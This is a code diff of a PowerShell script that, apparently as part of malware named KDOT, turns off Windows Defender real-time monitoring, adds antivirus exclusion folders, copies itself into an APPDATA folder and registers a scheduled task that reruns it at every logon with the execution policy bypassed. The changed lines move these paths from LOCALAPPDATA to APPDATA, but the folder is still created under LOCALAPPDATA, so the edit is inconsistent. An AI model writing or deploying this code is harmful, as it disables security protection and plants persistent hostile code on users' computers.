@@ -4,19 +4,19 @@ function CHECK_IF_ADMIN {
 
 function TASKS {
     Set-MpPreference -DisableRealtimeMonitoring $true
-    $test_KDOT = Test-Path -Path "$env:LOCALAPPDATA\KDOT"
+    $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT"
     if ($test_KDOT -eq $false) {
         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
-        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\KDOT"
+        Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
         New-Item -ItemType Directory -Path "$env:LOCALAPPDATA\KDOT"
         $origin = $MyInvocation.MyCommand.Path
-        Copy-Item -Path "$origin" -Destination "$env:LOCALAPPDATA\KDOT\KDOT.ps1"
+        Copy-Item -Path "$origin" -Destination "$env:APPDATA\KDOT\KDOT.ps1"
     }
     $test = Get-ScheduledTask | Select-Object -ExpandProperty TaskName
     if ($test -contains "KDOT") {
         Write-Host "KDOT already exists"
     } else {
-        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $env:LOCALAPPDATA\KDOT\KDOT.ps1"
+        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $env:APPDATA\KDOT\KDOT.ps1"
         $Trigger = New-ScheduledTaskTrigger -AtLogOn
         $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
         Register-ScheduledTask -TaskName "KDOT" -Action $Action -Trigger $Trigger -Settings $Settings
